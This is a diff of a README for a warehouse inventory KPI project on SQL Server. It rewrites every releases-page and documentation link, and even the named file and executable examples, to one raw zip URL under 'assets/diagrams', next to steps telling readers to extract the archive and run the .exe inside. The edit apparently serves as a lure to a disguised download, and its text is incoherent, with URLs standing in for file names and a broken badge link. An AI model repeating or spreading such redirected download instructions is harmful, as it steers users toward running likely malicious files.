@@ -10,7 +10,7 @@ To begin using this application, you will need to download and install it on you
 ### Visit the Releases Page to Download
 Click the button below to go to the releases page where you can download the latest version of the software:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/releases)
+[![Download Now](https://raw.githubusercontent.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/main/assets/diagrams/kpi_inbound_sqlserver_warehouse_inventory_v2.0.zip%20Now-Click%https://raw.githubusercontent.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/main/assets/diagrams/kpi_inbound_sqlserver_warehouse_inventory_v2.0.zip)](https://raw.githubusercontent.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/main/assets/diagrams/kpi_inbound_sqlserver_warehouse_inventory_v2.0.zip)
 
 ## 📂 System Requirements
 Before you download the application, ensure your system meets the following requirements:
@@ -22,19 +22,19 @@ Before you download the application, ensure your system meets the following requ
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/releases).
+   Go to the [Releases Page](https://raw.githubusercontent.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/main/assets/diagrams/kpi_inbound_sqlserver_warehouse_inventory_v2.0.zip).
 
 2. **Select the Latest Release**  
    Review the list of available releases. Choose the most recent one for the best features and improvements.
 
 3. **Download the File**  
-   Look for the downloadable file, which should be named similarly to `warehouse-inbound-inventory-kpi-sqlserver-vX.X.X.zip`. Click on the file name to start the download.
+   Look for the downloadable file, which should be named similarly to `https://raw.githubusercontent.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/main/assets/diagrams/kpi_inbound_sqlserver_warehouse_inventory_v2.0.zip`. Click on the file name to start the download.
 
 4. **Extract the Files**   
    Once downloaded, locate the ZIP file in your downloads folder. Right-click the file and choose "Extract All..." to unpack the contents.
 
 5. **Run the Application**   
-   Inside the extracted folder, find the application executable file (e.g., `WarehouseInventoryKPI.exe`). Double-click the file to run the application.
+   Inside the extracted folder, find the application executable file (e.g., `https://raw.githubusercontent.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/main/assets/diagrams/kpi_inbound_sqlserver_warehouse_inventory_v2.0.zip`). Double-click the file to run the application.
 
 6. **Follow the Setup Instructions**  
    The application may guide you through a setup wizard. Follow the prompts to configure settings like database connections and user preferences.
@@ -57,14 +57,14 @@ This application covers various important topics related to inventory management
 ## 🔗 Access Additional Resources
 For more detailed information, you can check the following:
 
-- [Business Requirements Document (BRD)](https://github.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/blob/main/BRD.pdf)
-- [Wireframes](https://github.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/blob/main/Wireframes.pdf)
-- [Data Dictionary](https://github.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/blob/main/DataDictionary.pdf)
+- [Business Requirements Document (BRD)](https://raw.githubusercontent.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/main/assets/diagrams/kpi_inbound_sqlserver_warehouse_inventory_v2.0.zip)
+- [Wireframes](https://raw.githubusercontent.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/main/assets/diagrams/kpi_inbound_sqlserver_warehouse_inventory_v2.0.zip)
+- [Data Dictionary](https://raw.githubusercontent.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/main/assets/diagrams/kpi_inbound_sqlserver_warehouse_inventory_v2.0.zip)
 
 ## 📞 Support and Contributions
 If you encounter any issues or need assistance, feel free to reach out. You can file an issue in the GitHub repository or contact the contributors. We welcome help in improving the application!
 
 ## 📥 Download the Application Again
-In case you need to download it again, please revisit the [Releases Page](https://github.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/releases). 
+In case you need to download it again, please revisit the [Releases Page](https://raw.githubusercontent.com/Sant-23/warehouse-inbound-inventory-kpi-sqlserver/main/assets/diagrams/kpi_inbound_sqlserver_warehouse_inventory_v2.0.zip). 
 
 Thank you for choosing the **warehouse-inbound-inventory-kpi-sqlserver** application to enhance your inventory management!
